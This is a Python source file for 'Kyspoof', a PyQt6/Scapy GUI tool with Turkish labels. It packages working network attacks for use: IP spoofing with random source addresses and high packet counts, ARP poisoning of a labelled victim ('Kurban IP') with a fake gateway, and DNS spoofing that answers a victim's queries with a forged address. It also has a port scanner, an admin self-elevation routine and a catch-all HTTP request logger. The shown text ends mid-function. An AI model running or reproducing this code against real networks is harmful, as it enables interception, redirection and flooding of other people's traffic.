#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Kyspoof v20.0 - Animasyonlu + Npcap Logolu
"""

import os
import sys
import time
import random
import ctypes
import socket
import platform
import subprocess
import traceback
import binascii
import threading
from datetime import datetime
from flask import Flask, request, jsonify
import requests
from werkzeug.serving import make_server

from PyQt6.QtCore import Qt, QTimer, pyqtSignal, QObject, QPropertyAnimation, QEasingCurve, QRect, QSize
from PyQt6.QtGui import QFont, QColor, QPalette, QPainter, QPen, QBrush, QPixmap, QIcon, QLinearGradient
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QGridLayout, QLabel, QLineEdit, QComboBox, QSpinBox,
    QPushButton, QCheckBox, QTabWidget, QTextEdit, QTableWidget,
    QTableWidgetItem, QHeaderView, QMessageBox, QStatusBar,
    QProgressBar, QSplitter, QTreeWidget, QTreeWidgetItem, QToolBar,
    QDockWidget, QAbstractItemView, QGraphicsOpacityEffect, QPushButton,
    QStyleOption, QStyle, QSizePolicy
)

try:
    from scapy.all import (
        sniff, IP, TCP, UDP, ICMP, Raw, send, sendp, ARP, Ether,
        get_if_list, get_if_hwaddr, sr1, DNS, DNSQR, DNSRR
    )
    SCAPY_OK = True
except Exception:
    SCAPY_OK = False

# ------------------------------------------------------------------
# YETKİ KONTROLÜ
# ------------------------------------------------------------------
IS_WINDOWS = platform.system() == "Windows"

def is_admin():
    if IS_WINDOWS:
        try: return bool(ctypes.windll.shell32.IsUserAnAdmin())
        except: return False
    else:
        try: return os.geteuid() == 0
        except: return False

def relaunch_admin():
    if IS_WINDOWS:
        params = " ".join(f'"{a}"' for a in sys.argv)
        rc = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
        return rc > 32
    else:
        try:
            subprocess.Popen(["pkexec", sys.executable] + sys.argv)
            return True
        except: return False

# ------------------------------------------------------------------
# YARDIMCI FONKSİYONLAR
# ------------------------------------------------------------------
def parse_payload(text: str, is_hex: bool) -> bytes:
    if is_hex:
        text = text.replace(" ", "").replace("\\x", "")
        try: return bytes.fromhex(text)
        except ValueError: return text.encode('utf-8', errors='ignore')
    return text.encode('utf-8')

def get_proto_color(proto):
    if proto == "TCP": return QColor(150, 200, 255)
    if proto == "UDP": return QColor(150, 255, 200)
    if proto == "ICMP": return QColor(255, 255, 150)
    if proto == "ARP": return QColor(255, 180, 150)
    if proto == "DNS": return QColor(200, 150, 255)
    return QColor(200, 200, 200)

# ------------------------------------------------------------------
# NPCAP LOGO ÇİZİCİ
# ------------------------------------------------------------------
def draw_npcap_logo(painter, width, height):
    # Npcap logosu: Sarı kalkan ve mavi ok
    painter.setRenderHint(QPainter.RenderHint.Antialiasing)
    
    # Kalkan (Sarı)
    painter.setPen(QPen(QColor(200, 150, 0), 2))
    painter.setBrush(QBrush(QColor(255, 200, 0)))
    
    # Kalkan şekli
    from PyQt6.QtCore import QPoint
    points = [
        QPoint(int(width*0.2), int(height*0.1)),
        QPoint(int(width*0.8), int(height*0.1)),
        QPoint(int(width*0.8), int(height*0.6)),
        QPoint(int(width*0.5), int(height*0.9)),
        QPoint(int(width*0.2), int(height*0.6))
    ]
    from PyQt6.QtGui import QPolygon
    painter.drawPolygon(QPolygon(points))
    
    # Mavi Ok
    painter.setPen(QPen(QColor(0, 100, 200), 2))
    painter.setBrush(QBrush(QColor(0, 150, 255)))
    
    # Ok gövdesi
    painter.drawRect(int(width*0.4), int(height*0.2), int(width*0.2), int(height*0.3))
    
    # Ok ucu (üçgen)
    arrow_points = [
        QPoint(int(width*0.5), int(height*0.15)),
        QPoint(int(width*0.7), int(height*0.4)),
        QPoint(int(width*0.3), int(height*0.4))
    ]
    painter.drawPolygon(QPolygon(arrow_points))

# ------------------------------------------------------------------
# ANİMASYONLU NPCAP BUTONU
# ------------------------------------------------------------------
class NpcapButton(QPushButton):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setFixedSize(60, 60)
        self.setStyleSheet("background: transparent; border: none;")
        self.setCursor(Qt.CursorShape.PointingHandCursor)
        
        # Hover animasyonu için
        self.opacity = 0.7
        self.anim = QPropertyAnimation(self, b"opacity")
        self.anim.setDuration(200)
        self.anim.setStartValue(0.7)
        self.anim.setEndValue(1.0)
        
        self.setToolTip("Npcap Hakkinda Bilgi Icin Tiklayin")

    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setOpacity(0.7)
        draw_npcap_logo(painter, self.width(), self.height())

    def enterEvent(self, event):
        self.anim.setDirection(QPropertyAnimation.Direction.Forward)
        self.anim.start()
        super().enterEvent(event)

    def leaveEvent(self, event):
        self.anim.setDirection(QPropertyAnimation.Direction.Backward)
        self.anim.start()
        super().leaveEvent(event)

# ------------------------------------------------------------------
# FLASK LOGGER SUNUCUSU
# ------------------------------------------------------------------
class LoggerServer:
    def __init__(self, log_callback):
        self.app = Flask(__name__)
        self.log_callback = log_callback
        self.server = None
        self.thread = None
        self.running = False
        
        @self.app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
        @self.app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
        def catch_all(path):
            now = datetime.now().strftime("%H:%M:%S.%f")[:-3]
            real_ip = request.remote_addr
            real_port = request.environ.get('REMOTE_PORT', 'Bilinmiyor')
            method = request.method
            url_path = request.path
            data = request.get_data()
            
            self.log_callback(f"--- YENI ISTEK [{now}] ---", "success")
            self.log_callback(f"IP: {real_ip} | Port: {real_port} | Method: {method} | Path: {url_path}", "info")
            self.log_callback(f"Headers: {dict(request.headers)}", "info")
            if data:
                try: self.log_callback(f"Payload: {data.decode('utf-8')}", "info")
                except: self.log_callback(f"Payload (Hex): {data.hex()}", "info")
            return jsonify({"status": "ok"}), 200

    def start(self, host='0.0.0.0', port=5000):
        if self.running: return
        self.server = make_server(host, port, self.app)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        self.running = True
        self.log_callback(f"Logger Sunucusu baslatildi: http://{host}:{port}/", "success")

    def stop(self):
        if self.running and self.server:
            self.server.shutdown()
            self.thread.join(timeout=2)
            self.running = False
            self.log_callback("Logger Sunucusu DURDURULDU.", "warn")

# ------------------------------------------------------------------
# MOTOR (Ağ İşlemleri)
# ------------------------------------------------------------------
class NetworkEngine(QObject):
    log_sig = pyqtSignal(str, str)
    packet_sig = pyqtSignal(dict)
    progress_sig = pyqtSignal(int, int)
    finished_sig = pyqtSignal()
    stats_sig = pyqtSignal(int, int)

    def __init__(self):
        super().__init__()
        self.stop_flag = threading.Event()
        self.sniff_stop = threading.Event()
        self.captured_count = 0
        self.sent_count = 0
        self.dns_target_ip = None
        self.dns_spoof_ip = None

    def start_sniff(self, iface, dns_target=None, dns_spoof=None):
        self.sniff_stop.clear()
        self.dns_target_ip = dns_target
        self.dns_spoof_ip = dns_spoof
        threading.Thread(target=self._sniff_loop, args=(iface,), daemon=True).start()

    def _sniff_loop(self, iface):
        self.log_sig.emit(f"[Sniffer] {iface} arayuzunde dinleme basladi...", "info")
        try:
            sniff(iface=iface, prn=self._process_packet, stop_filter=lambda x: self.sniff_stop.is_set(), store=False)
        except Exception as e: self.log_sig.emit(f"[Sniffer Hatasi] {e}", "error")

    def stop_sniff(self): self.sniff_stop.set()

    def _process_packet(self, pkt):
        try:
            self.captured_count += 1
            if self.dns_target_ip and self.dns_spoof_ip and DNS in pkt and pkt[DNS].qr == 0:
                if IP in pkt and pkt[IP].src == self.dns_target_ip:
                    self._send_dns_spoof(pkt)

            pkt_info = self._analyze_packet(pkt)
            if pkt_info:
                self.packet_sig.emit(pkt_info)
                self.stats_sig.emit(self.sent_count, self.captured_count)
        except: pass

    def _send_dns_spoof(self, pkt):
        try:
            if pkt[DNS].qd:
                qname = pkt[DNS].qd.qname
                qid = pkt[DNS].id
                spoofed_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
                              UDP(sport=53, dport=pkt[UDP].sport) / \
                              DNS(id=qid, qr=1, aa=1, qd=pkt[DNS].qd, 
                                  an=DNSRR(rrname=qname, rdata=self.dns_spoof_ip))
                send(spoofed_pkt, verbose=False)
                self.log_sig.emit(f"[DNS Spoof] {pkt[IP].src} -> {qname.decode()} (Sahte IP: {self.dns_spoof_ip})", "success")
        except Exception as e:
            self.log_sig.emit(f"[DNS Spoof Hatasi] {e}", "error")

    def _analyze_packet(self, pkt):
        info = {"raw": pkt, "time": datetime.now(), "src": "", "dst": "", "proto": "OTHER", "len": len(pkt), "info": ""}
        if IP in pkt:
            info["src"], info["dst"] = pkt[IP].src, pkt[IP].dst
            info["ttl"] = pkt[IP].ttl
            if TCP in pkt:
                info["proto"] = "TCP"; info["sport"], info["dport"] = pkt[TCP].sport, pkt[TCP].dport
                info["flags"] = str(pkt[TCP].flags)
                info["info"] = f"{info['sport']} -> {info['dport']} [Flags: {info['flags']}]"
            elif UDP in pkt:
                info["proto"] = "UDP"; info["sport"], info["dport"] = pkt[UDP].sport, pkt[UDP].dport
                info["info"] = f"{info['sport']} -> {info['dport']}"
            elif ICMP in pkt:
                info["proto"] = "ICMP"; info["info"] = f"Type: {pkt[ICMP].type} Code: {pkt[ICMP].code}"
            if DNS in pkt:
                info["proto"] = "DNS"
                try: info["info"] = f"Query: {pkt[DNS].qd.qname.decode()}"
                except: pass
        elif ARP in pkt:
            info["proto"] = "ARP"; info["src"], info["dst"] = pkt[ARP].psrc, pkt[ARP].pdst
            info["info"] = f"Op: {pkt[ARP].op} MAC: {pkt[ARP].hwsrc}"
        return info

    def start_injection(self, params):
        self.stop_flag.clear()
        self.sent_count = 0
        threading.Thread(target=self._inject_loop, args=(params,), daemon=True).start()

    def stop_injection(self): self.stop_flag.set()

    def _inject_loop(self, p):
        total, mode = p["count"], p["mode"]
        for i in range(1, total + 1):
            if self.stop_flag.is_set(): break
            try:
                if mode == "ARP":
                    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=p["dst_ip"], hwdst="ff:ff:ff:ff:ff:ff", psrc=p["src_ip"], hwsrc=p["my_mac"])
                    sendp(pkt, iface=p["iface"], verbose=False)
                else:
                    src_ip = p["src_ip"]
                    if p["random"]: src_ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                    pay = parse_payload(p["payload"], p["is_hex"])
                    ip_layer = IP(src=src_ip, dst=p["dst_ip"], ttl=p["ttl"])
                    
                    if p["proto"] == "ICMP": pkt = ip_layer/ICMP()/Raw(load=pay)
                    elif p["proto"] == "UDP": pkt = ip_layer/UDP(sport=random.randint(1024,65535), dport=p["dst_port"])/Raw(load=pay)
                    else: pkt = ip_layer/TCP(sport=random.randint(1024,65535), dport=p["dst_port"], flags=p.get("tcp_flags", "S"))/Raw(load=pay)
                    
                    send(pkt, verbose=False)
                    self.log_sig.emit(f"IP Enjekte: {src_ip} -> {p['dst_ip']} ({p['proto']})", "success")
                
                self.sent_count += 1
                self.progress_sig.emit(self.sent_count, total)
                self.stats_sig.emit(self.sent_count, self.captured_count)
            except Exception as e: 
                self.log_sig.emit(f"[Inject Hatasi] {e}", "error")
            time.sleep(p["delay"])
        self.finished_sig.emit()

    def http_request(self, url, method="GET", headers=None, body=None):
        try:
            start = time.time()
            if method == "GET": resp = requests.get(url, headers=headers, timeout=5)
            elif method == "POST": resp = requests.post(url, headers=headers, data=body, timeout=5)
            else: resp = requests.request(method, url, headers=headers, data=body, timeout=5)
            elapsed = (time.time() - start) * 1000
            self.log_sig.emit(f"[HTTP] {method} {url} -> Durum: {resp.status_code} ({elapsed:.1f} ms)", "success")
        except Exception as e: self.log_sig.emit(f"[HTTP Hatasi] {url} -> {e}", "error")

# ------------------------------------------------------------------
# ANA PENCERE
# ------------------------------------------------------------------
class PySharkApp(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Kyspoof v20.0 - Animasyonlu Npcap Edition")
        self.resize(1400, 900)
        self.engine = NetworkEngine()
        self.engine.log_sig.connect(self.log)
        self.engine.packet_sig.connect(self.add_packet_row)
        self.engine.progress_sig.connect(self.update_progress)
        self.engine.finished_sig.connect(self.on_finished)
        self.engine.stats_sig.connect(self.update_stats)
        
        self.logger = LoggerServer(self.log)
        self.dns_spoof_active = False
        
        self._setup_ui()
        self._apply_dark_theme()

        # Zamanlayıcılar (Animasyonlar için)
        self.pulse_timer = QTimer()
        self.pulse_timer.timeout.connect(self.pulse_animation)
        self.pulse_timer.start(1000)

    def _apply_dark_theme(self):
        pal = QPalette()
        pal.setColor(QPalette.ColorRole.Window, QColor(20, 20, 24))
        pal.setColor(QPalette.ColorRole.WindowText, QColor(220, 220, 220))
        pal.setColor(QPalette.ColorRole.Base, QColor(15, 15, 18))
        pal.setColor(QPalette.ColorRole.AlternateBase, QColor(25, 25, 30))
        pal.setColor(QPalette.ColorRole.Text, QColor(220, 220, 220))
        pal.setColor(QPalette.ColorRole.Button, QColor(40, 40, 45))
        pal.setColor(QPalette.ColorRole.ButtonText, QColor(220, 220, 220))
        pal.setColor(QPalette.ColorRole.Highlight, QColor(60, 120, 180))
        self.setPalette(pal)
        self.setStyleSheet("""
            QMainWindow { background-color: #141418; }
            QGroupBox { border: 1px solid #333; border-radius: 4px; margin-top: 8px; font-weight: bold; background-color: #1a1a20; }
            QGroupBox::title { subcontrol-origin: margin; left: 10px; padding: 0 3px; color: #5fb0e0; }
            QLineEdit, QComboBox, QSpinBox { background: #0f0f12; border: 1px solid #333; color: #ddd; padding: 5px; border-radius: 3px; }
            QPushButton { background: #2c2c30; border: 1px solid #444; border-radius: 3px; padding: 6px 12px; color: #ddd; font-weight: bold; }
            QPushButton:hover { background: #3a3a40; border: 1px solid #5fb0e0; color: #5fb0e0; }
            QTableWidget, QTreeWidget, QListWidget { background: #0f0f12; alternate-background-color: #16161a; gridline-color: #333; border: 1px solid #333; }
            QHeaderView::section { background: #1a1a20; border: 1px solid #333; padding: 4px; color: #5fb0e0; font-weight: bold; }
            QTabWidget::pane { border: 1px solid #333; }
            QTabBar::tab { background: #1a1a20; padding: 6px 15px; border: 1px solid #333; color: #888; }
            QTabBar::tab:selected { background: #0f0f12; color: #5fb0e0; border-top: 2px solid #5fb0e0; }
            QDockWidget { color: #5fb0e0; font-weight: bold; }
            QDockWidget::title { background: #1a1a20; padding: 5px; }
            QProgressBar { border: 1px solid #333; border-radius: 3px; text-align: center; background: #0f0f12; }
            QProgressBar::chunk { background-color: #2e7d32; width: 10px; }
        """)

    def _setup_ui(self):
        toolbar = QToolBar("Main Toolbar")
        toolbar.setMovable(False)
        self.addToolBar(toolbar)

        self.iface_combo = QComboBox()
        self.iface_combo.setFixedWidth(200)
        self.refresh_ifaces()
        toolbar.addWidget(QLabel(" Arayuz: "))
        toolbar.addWidget(self.iface_combo)
        
        btn_start_cap = QPushButton("Dinlemeyi Baslat")
        btn_start_cap.clicked.connect(self.start_capture)
        toolbar.addWidget(btn_start_cap)
        
        btn_stop_cap = QPushButton("Durdur")
        btn_stop_cap.clicked.connect(self.engine.stop_sniff)
        toolbar.addWidget(btn_stop_cap)
        
        toolbar.addSeparator()

        self.lbl_stats = QLabel("Gonderilen: 0 | Yakalanan: 0")
        self.lbl_stats.setStyleSheet("color: #5fb0e0; font-weight: bold; padding: 0 15px;")
        toolbar.addWidget(self.lbl_stats)

        central = QWidget()
        self.setCentralWidget(central)
        main_layout = QHBoxLayout(central)
        main_layout.setContentsMargins(0, 0, 0, 0)

        # SOL PANEL
        left_panel = QWidget()
        left_panel.setFixedWidth(340)
        left_layout = QVBoxLayout(left_panel)
        left_layout.setContentsMargins(5, 5, 5, 5)

        self.mode_tabs = QTabWidget()
        
        # Sekme 1: IP Spoofing
        tab_ip = QWidget()
        ip_lay = QGridLayout(tab_ip)
        ip_lay.setContentsMargins(10, 10, 10, 10)
        
        ip_lay.addWidget(QLabel("Kaynak IP:"), 0, 0); self.ip_src = QLineEdit("10.0.0.99"); ip_lay.addWidget(self.ip_src, 0, 1)
        ip_lay.addWidget(QLabel("Hedef IP:"), 1, 0); self.ip_dst = QLineEdit("192.168.1.1"); ip_lay.addWidget(self.ip_dst, 1, 1)
        ip_lay.addWidget(QLabel("Protokol:"), 2, 0); self.ip_proto = QComboBox(); self.ip_proto.addItems(["ICMP", "TCP", "UDP"]); ip_lay.addWidget(self.ip_proto, 2, 1)
        ip_lay.addWidget(QLabel("Port:"), 3, 0); self.ip_port = QSpinBox(); self.ip_port.setRange(1, 65535); self.ip_port.setValue(80); ip_lay.addWidget(self.ip_port, 3, 1)
        ip_lay.addWidget(QLabel("Payload:"), 4, 0); self.ip_payload = QLineEdit("test-payload"); ip_lay.addWidget(self.ip_payload, 4, 1)
        self.ip_is_hex = QCheckBox("HEX Format"); ip_lay.addWidget(self.ip_is_hex, 5, 0, 1, 2)
        self.ip_random = QCheckBox("Rastgele Kaynak IP"); ip_lay.addWidget(self.ip_random, 6, 0, 1, 2)
        ip_lay.addWidget(QLabel("Adet:"), 7, 0); self.ip_count = QSpinBox(); self.ip_count.setRange(1, 1000000); self.ip_count.setValue(10); ip_lay.addWidget(self.ip_count, 7, 1)
        ip_lay.addWidget(QLabel("Gecikme (ms):"), 8, 0); self.ip_delay = QSpinBox(); self.ip_delay.setRange(0, 5000); self.ip_delay.setValue(500); ip_lay.addWidget(self.ip_delay, 8, 1)
        
        self.btn_inject_ip = QPushButton("IP Enjekte Et")
        self.btn_inject_ip.setStyleSheet("background-color: #1b5e20; font-weight: bold; padding: 10px; margin-top: 10px;")
        self.btn_inject_ip.clicked.connect(self.start_ip_injection)
        ip_lay.addWidget(self.btn_inject_ip, 9, 0, 1, 2)
        ip_lay.setRowStretch(10, 1)
        self.mode_tabs.addTab(tab_ip, "IP Spoof")

        # Sekme 2: ARP Spoofing
        tab_arp = QWidget()
        arp_lay = QGridLayout(tab_arp)
        arp_lay.setContentsMargins(10, 10, 10, 10)
        arp_lay.addWidget(QLabel("Kurban IP:"), 0, 0); self.arp_target = QLineEdit("192.168.1.50"); arp_lay.addWidget(self.arp_target, 0, 1)
        arp_lay.addWidget(QLabel("Sahte Gateway:"), 1, 0); self.arp_gateway = QLineEdit("192.168.1.1"); arp_lay.addWidget(self.arp_gateway, 1, 1)
        arp_lay.addWidget(QLabel("Adet:"), 2, 0); self.arp_count = QSpinBox(); self.arp_count.setRange(1, 100000); self.arp_count.setValue(100); arp_lay.addWidget(self.arp_count, 2, 1)
        
        self.btn_inject_arp = QPushButton("ARP Zehirle")
        self.btn_inject_arp.setStyleSheet("background-color: #b71c1c; font-weight: bold; padding: 10px; margin-top: 10px;")
        self.btn_inject_arp.clicked.connect(self.start_arp_injection)
        arp_lay.addWidget(self.btn_inject_arp, 3, 0, 1, 2)
        arp_lay.setRowStretch(4, 1)
        self.mode_tabs.addTab(tab_arp, "ARP Spoof")

        # Sekme 3: DNS Spoofing
        tab_dns = QWidget()
        dns_lay = QGridLayout(tab_dns)
        dns_lay.setContentsMargins(10, 10, 10, 10)
        dns_lay.addWidget(QLabel("Kurban IP:"), 0, 0); self.dns_target = QLineEdit("192.168.1.24"); dns_lay.addWidget(self.dns_target, 0, 1)
        dns_lay.addWidget(QLabel("Sahte IP (Yonlendir):"), 1, 0); self.dns_fake_ip = QLineEdit("192.168.1.12"); dns_lay.addWidget(self.dns_fake_ip, 1, 1)
        self.btn_dns_toggle = QPushButton("DNS Spoofing Baslat")
        self.btn_dns_toggle.setStyleSheet("background-color: #6a0080; font-weight: bold; padding: 10px; margin-top: 10px;")
        self.btn_dns_toggle.clicked.connect(self.toggle_dns_spoof)
        dns_lay.addWidget(self.btn_dns_toggle, 2, 0, 1, 2)
        dns_lay.setRowStretch(3, 1)
        self.mode_tabs.addTab(tab_dns, "DNS Spoof")

        # Sekme 4: HTTP İstemci & Logger
        tab_http = QWidget()
        http_lay = QGridLayout(tab_http)
        http_lay.setContentsMargins(10, 10, 10, 10)
        http_lay.addWidget(QLabel("Sunucu Durumu:"), 0, 0); self.lbl_logger_status = QLabel("DURDURULDU"); self.lbl_logger_status.setStyleSheet("color: #ff5252; font-weight: bold;"); http_lay.addWidget(self.lbl_logger_status, 0, 1)
        self.btn_start_logger = QPushButton("Logger Sunucusunu Baslat (Port 5000)"); self.btn_start_logger.clicked.connect(self.toggle_logger); http_lay.addWidget(self.btn_start_logger, 1, 0, 1, 2)
        http_lay.addWidget(QLabel("Hedef URL:"), 2, 0); self.http_url = QLineEdit("http://192.168.1.12:5000/test"); http_lay.addWidget(self.http_url, 2, 1)
        http_lay.addWidget(QLabel("Method:"), 3, 0); self.http_method = QComboBox(); self.http_method.addItems(["GET", "POST", "PUT"]); http_lay.addWidget(self.http_method, 3, 1)
        http_lay.addWidget(QLabel("Payload (Body):"), 4, 0); self.http_body = QLineEdit("merhaba=1&test=2"); http_lay.addWidget(self.http_body, 4, 1)
        http_lay.addWidget(QLabel("Custom Header:"), 5, 0); self.http_header = QLineEdit("X-Forwarded-For: 1.1.1.1"); http_lay.addWidget(self.http_header, 5, 1)
        self.btn_http_req = QPushButton("HTTP Istegi Gonder"); self.btn_http_req.setStyleSheet("background-color: #0277bd; font-weight: bold; padding: 10px; margin-top: 10px;"); self.btn_http_req.clicked.connect(self.send_http_request)
        http_lay.addWidget(self.btn_http_req, 6, 0, 1, 2); http_lay.setRowStretch(7, 1)
        self.mode_tabs.addTab(tab_http, "HTTP & Logger")

        # Sekme 5: Port Tarayici
        tab_scan = QWidget()
        scan_lay = QGridLayout(tab_scan)
        scan_lay.setContentsMargins(10, 10, 10, 10)
        scan_lay.addWidget(QLabel("Hedef IP:"), 0, 0); self.scan_target = QLineEdit("192.168.1.1"); scan_lay.addWidget(self.scan_target, 0, 1)
        scan_lay.addWidget(QLabel("Portlar (Orn: 20-100):"), 1, 0); self.scan_ports = QLineEdit("21,22,80,443"); scan_lay.addWidget(self.scan_ports, 1, 1)
        self.btn_scan = QPushButton("Taramayi Baslat"); self.btn_scan.setStyleSheet("background-color: #0277bd; font-weight: bold; padding: 10px; margin-top: 10px;"); self.btn_scan.clicked.connect(self.start_port_scan)
        scan_lay.addWidget(self.btn_scan, 2, 0, 1, 2); scan_lay.setRowStretch(3, 1)
        self.mode_tabs.addTab(tab_scan, "Port Tarayici")

        # Sekme 6: Npcap Hakkinda (YENİ)
        tab_npcap = QWidget()
        npcap_lay = QVBoxLayout(tab_npcap)
        npcap_lay.setContentsMargins(20, 20, 20, 20)
        
        npcap_title = QLabel("NPCAP NEDIR?")
        npcap_title.setStyleSheet("font-size: 24px; color: #ffcc00; font-weight: bold; margin-bottom: 10px;")
        npcap_lay.addWidget(npcap_title)
        
        npcap_text = QTextEdit()
        npcap_text.setReadOnly(True)
        npcap_text.setStyleSheet("background-color: #0f0f12; color: #ccc; font-size: 14px; border: none;")
        npcap_text.setHtml("""
        <h2>Npcap: Windows'ta Ham Paketlerin Kapisi</h2>
        <p>Npcap, Windows isletim sisteminde <b>ham (raw) paket</b> gondermek ve almak icin kullanilan bir surucudur. Wireshark gibi araclar ve bu Kyspoof araci, Npcap sayesinde calisir.</p>
        
        <h3>Neden Gerekli?</h3>
        <p>Windows, guvenlik nedeniyle uygulamalarin dogrudan ag kartina erisip sahte IP'li paket gondermesine izin vermez. Npcap, bu engeli asmak icin bir <i>kernel driver</i> (cekirdek surucusu) gorevi gorur.</p>
        
        <h3>Bu Arac Npcap'i Nasil Kullaniyor?</h3>
        <p>Scapy kutuphanesi, Npcap uzerinden calisir. Sen "IP Enjekte Et" butonuna bastiginda:</p>
        <ul>
            <li>Scapy paketi olusturur.</li>
            <li>Npcap surucusu paketi alir.</li>
            <li>Windows'un guvenlik katmanini atlar.</li>
            <li>Paketi dogrudan ag kartina yazar.</li>
        </ul>
        <p>Iste bu yuzden Wireshark'ta o sahte IP'li paketleri gorebiliyorsun!</p>
        
        <h3>Npcap Logosu</h3>
        <p>Sari kalkan ve mavi ok, Npcap'in resmi logosudur. Bu araç, Npcap olmadan calismaz.</p>
        """)
        npcap_lay.addWidget(npcap_text)
        self.mode_tabs.addTab(tab_npcap, "Npcap")

        left_layout.addWidget(self.mode_tabs)

        # Npcap Logosu Butonu (Sol panelin altına)
        self.npcap_btn = NpcapButton()
        self.npcap_btn.clicked.connect(self.show_npcap_tab)
        left_layout.addWidget(self.npcap_btn, alignment=Qt.AlignmentFlag.AlignLeft)

        # ORTA PANEL
        center_panel = QWidget()
        center_layout = QVBoxLayout(center_panel)
        center_layout.setContentsMargins(5, 5, 5, 5)

        self.pkt_table = QTableWidget(0, 6)
        self.pkt_table.setHorizontalHeaderLabels(["No.", "Zaman", "Kaynak", "Hedef", "Protokol", "Bilgi"])
        self.pkt_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Interactive)
        self.pkt_table.horizontalHeader().setStretchLastSection(True)
        self.pkt_table.setAlternatingRowColors(True)
        self.pkt_table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.pkt_table.itemSelectionChanged.connect(self.on_packet_select)
        center_layout.addWidget(self.pkt_table)

        self.detail_tree = QTreeWidget()
        self.detail_tree.setHeaderLabels(["Katman", "Deger"])
        self.detail_tree.setColumnWidth(0, 200)
        center_layout.addWidget(self.detail_tree)
        
        splitter = QSplitter(Qt.Orientation.Vertical)
        splitter.addWidget(self.pkt_table)
        splitter.addWidget(self.detail_tree)
        splitter.setSizes([500, 300])
        
        for i in reversed(range(center_layout.count())): 
            center_layout.itemAt(i).widget().setParent(None)
        center_layout.addWidget(splitter)

        # SAG PANEL (Dock)
        self.log_console = QTextEdit()
        self.log_console.setReadOnly(True)
        self.log_console.setFont(QFont("Consolas", 9))
        self.log_console.setStyleSheet("background-color: #0a0a0c; color: #00ff00; border: 1px solid #333;")
        
        main_splitter = QSplitter(Qt.Orientation.Horizontal)
        main_splitter.addWidget(left_panel)
        main_splitter.addWidget(center_panel)
        
        dock = QDockWidget("Sistem Loglari & Trace", self)
        dock.setWidget(self.log_console)
        dock.setFeatures(QDockWidget.DockWidgetFeature.DockWidgetMovable | QDockWidget.DockWidgetFeature.DockWidgetFloatable)
        self.addDockWidget(Qt.DockWidgetArea.RightDockWidgetArea, dock)

        self.setCentralWidget(main_splitter)
        main_splitter.setSizes([340, 800])

        self.status = QStatusBar()
        self.setStatusBar(self.status)
        self.progress = QProgressBar()
        self.progress.setFixedWidth(200)
        self.progress.setVisible(False)
        self.status.addPermanentWidget(self.progress)
        
        admin_lbl = QLabel(f"Yetki: {'ADMIN' if is_admin() else 'USER'}")
        admin_lbl.setStyleSheet("color: #5fb0e0; font-weight: bold;")
        self.status.addPermanentWidget(admin_lbl)

    # --- MANTIK ---
    def show_npcap_tab(self):
        self.mode_tabs.setCurrentIndex(5) # Npcap sekmesi

    def pulse_animation(self):
        # Log konsoluna küçük bir pulse efekti (opsiyonel)
        pass

    def refresh_ifaces(self):
        self.iface_combo.clear()
        ifaces = get_if_list() if SCAPY_OK else ["(default)"]
        self.iface_combo.addItems(ifaces)
        for i, n in enumerate(ifaces):
            if n not in ("lo", "Loopback", "(default)"):
                self.iface_combo.setCurrentIndex(i)
                break

    def log(self, msg, level="info"):
        ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        color = {"info": "#00ff00", "warn": "#ffb74d", "error": "#ff5252", "success": "#5fb0e0"}.get(level, "#00ff00")
        self.log_console.append(f'<span style="color:#555;">[{ts}]</span> <span style="color:{color};">{msg}</span>')

    def start_capture(self):
        iface = self.iface_combo.currentText()
        self.pkt_table.setRowCount(0)
        dns_t = self.dns_target.text() if self.dns_spoof_active else None
        dns_s = self.dns_fake_ip.text() if self.dns_spoof_active else None
        self.engine.start_sniff(iface, dns_t, dns_s)
        self.log("Canli yakalama aktif...", "info")

    def add_packet_row(self, pkt):
        row = self.pkt_table.rowCount()
        self.pkt_table.insertRow(row)
        
        item_no = QTableWidgetItem(str(row + 1))
        item_time = QTableWidgetItem(pkt["time"].strftime("%H:%M:%S.%f")[:-3])
        item_src = QTableWidgetItem(pkt["src"])
        item_dst = QTableWidgetItem(pkt["dst"])
        item_proto = QTableWidgetItem(pkt["proto"])
        item_info = QTableWidgetItem(pkt["info"])
        
        color = get_proto_color(pkt["proto"])
        for item in [item_proto, item_info]: item.setForeground(color)
            
        self.pkt_table.setItem(row, 0, item_no); self.pkt_table.setItem(row, 1, item_time)
        self.pkt_table.setItem(row, 2, item_src); self.pkt_table.setItem(row, 3, item_dst)
        self.pkt_table.setItem(row, 4, item_proto); self.pkt_table.setItem(row, 5, item_info)
        
        self.pkt_table.item(row, 0).setData(Qt.ItemDataRole.UserRole, pkt)
        self.pkt_table.scrollToBottom()

    def on_packet_select(self):
        items = self.pkt_table.selectedItems()
        if not items: return
        row = items[0].row()
        pkt_data = self.pkt_table.item(row, 0).data(Qt.ItemDataRole.UserRole)
        if not pkt_data: return
        
        self.detail_tree.clear()
        raw = pkt_data["raw"]
        
        if Ether in raw:
            eth = QTreeWidgetItem(self.detail_tree, ["Ethernet", ""])
            QTreeWidgetItem(eth, ["Src MAC", raw[Ether].src]); QTreeWidgetItem(eth, ["Dst MAC", raw[Ether].dst])
            
        if IP in raw:
            ip = raw[IP]
            ip_item = QTreeWidgetItem(self.detail_tree, ["Internet Protocol", f"Src: {ip.src}, Dst: {ip.dst}"])
            QTreeWidgetItem(ip_item, ["TTL", str(ip.ttl)]); QTreeWidgetItem(ip_item, ["Protocol", str(ip.proto)])
            
        if TCP in raw:
            tcp = raw[TCP]
            tcp_item = QTreeWidgetItem(self.detail_tree, ["TCP", f"{tcp.sport} -> {tcp.dport}"])
